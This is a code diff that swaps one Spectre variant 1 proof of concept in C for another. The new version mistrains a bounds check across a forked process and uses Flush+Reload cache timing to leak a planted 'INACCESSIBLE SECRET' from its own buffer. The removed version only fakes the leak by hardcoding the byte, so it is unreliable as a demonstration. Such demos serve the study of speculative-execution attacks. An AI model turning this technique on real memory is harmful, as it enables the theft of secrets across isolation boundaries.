@@ -1,78 +1,96 @@
-#include <stdio.h>
+#include <pthread.h>
 #include <stdint.h>
-#include <x86intrin.h> // rdtscp, clflush
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
-#define ARRAY2_SIZE 256 * 512
-#define TRAINING_LOOPS 1000
+#include "cacheutils.h"
 
-// 将 array1_size 设为可flush的全局变量
-volatile int array1_size = 16;
-uint8_t array1[160];  // 多留空间以允许越界模拟
-uint8_t array2[ARRAY2_SIZE];
-uint8_t volatile temp = 0;
+// accessible data
+#define DATA "data|"
+// inaccessible secret (following accessible data)
+#define SECRET "INACCESSIBLE SECRET"
 
-void victim_function(size_t x) {
-    if (x < array1_size) {
-        temp = array2['S' * 512];
+#define DATA_SECRET DATA SECRET
+
+unsigned char data[128];
+
+char access_array(int x) {
+  // flushing the data which is used in the condition increases
+  // probability of speculation
+  size_t len = sizeof(DATA) - 1;
+  mfence();
+  flush(&len);
+  flush(&x);
+  
+  // ensure data is flushed at this point
+  mfence();
+
+  // check that only accessible part (DATA) can be accessed
+  if((float)x / (float)len < 1) {
+    // countermeasure: add the fence here
+    cache_encode(data[x]);
+  }
+}
+
+int main(int argc, const char **argv) {
+  // Detect cache threshold
+  if(!CACHE_MISS) 
+    CACHE_MISS = detect_flush_reload_threshold();
+  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
+
+  pagesize = sysconf(_SC_PAGESIZE);
+  printf("[\x1b[33m*\x1b[0m] Page Size: \x1b[33m%zd\x1b[0m\n", pagesize);
+  char *_mem = malloc(pagesize * (256 + 4));
+  // page aligned
+  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
+
+  pid_t pid = fork();
+  // initialize memory
+  memset(mem, pid, pagesize * 256);
+
+  // store secret
+  memset(data, ' ', sizeof(data));
+  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
+  // ensure data terminates
+  data[sizeof(data) / sizeof(data[0]) - 1] = '0';
+
+  // flush our shared memory
+  flush_shared_memory();
+
+  // nothing leaked so far
+  char leaked[sizeof(DATA_SECRET) + 1];
+  memset(leaked, ' ', sizeof(leaked));
+  leaked[sizeof(DATA_SECRET)] = 0;
+
+  int j = 0;
+  while(1) {
+    // for every byte in the string
+    j = (j + 1) % sizeof(DATA_SECRET);
+
+    // mistrain with valid index
+	if(pid == 0) {
+	    for(int y = 0; y < 10; y++) {
+	      access_array(0);
+	    }
+	}
+	else {
+		// potential out-of-bounds access
+		access_array(j);
+
+		// only show inaccessible values (SECRET)
+		if(j >= sizeof(DATA) - 1) {
+		  mfence(); // avoid speculation
+		  cache_decode_pretty(leaked, j);
     }
+
+		if(!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
+      break;
+
+		sched_yield();
+		}
+	}
+	printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
 }
 
-void read_memory_byte_timing(size_t malicious_x) {
-    int results[256];
-    memset(results, 0, sizeof(results));
-
-    for (int run = 0; run < 1; run++) {
-        // 冲刷 array2 的缓存
-        for (int i = 0; i < 256; i++) {
-            _mm_clflush(&array2[i * 512]);
-        }
-
-        // 多轮训练 + 攻击执行
-        for (int j = TRAINING_LOOPS; j >= 0; j--) {
-            size_t x = j % array1_size; // 正常访问
-            _mm_clflush((void *)&array1_size);  // 确保从内存重新加载
-            _mm_mfence();
-            victim_function(x);
-        }
-        for (int i = 0; i < 256; i++) {
-            _mm_clflush(&array2[i * 512]);
-        }
-        _mm_lfence(); 
-        _mm_clflush(&malicious_x); 
-        _mm_clflush(&array1_size); 
-        _mm_lfence(); 
-
-        victim_function(malicious_x); // 插入恶意访问
-
-        _mm_lfence(); 
-        // 侧信道探测哪个值被带入缓存
-        for (int i = 0; i < 256; i++) {
-            int mix_i = ((i * 13) + 3) & 255;
-            uint8_t *addr = &array2[mix_i * 512];
-            unsigned int junk = 0;
-            uint64_t t1 = __rdtscp(&junk);
-            junk = *addr;
-            uint64_t t2 = __rdtscp(&junk) - t1;
-
-            printf("Epoch[%d], Mix[%d]: Time = %llu cycles\n", i, mix_i, t2);
-        }
-    }
-}
-
-int main() {
-    // 初始化 array1、array2
-    for (int i = 0; i < array1_size; i++) array1[i] = i;
-    for (int i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;
-
-    // 模拟越界位置处的值为 42
-    ((uint8_t *)array1)[array1_size + 5] = 'S';
-
-    // 设置攻击地址
-    size_t malicious_x = (size_t)(array1_size + 5);
-
-    read_memory_byte_timing(malicious_x);
-
-    return 0;
-}
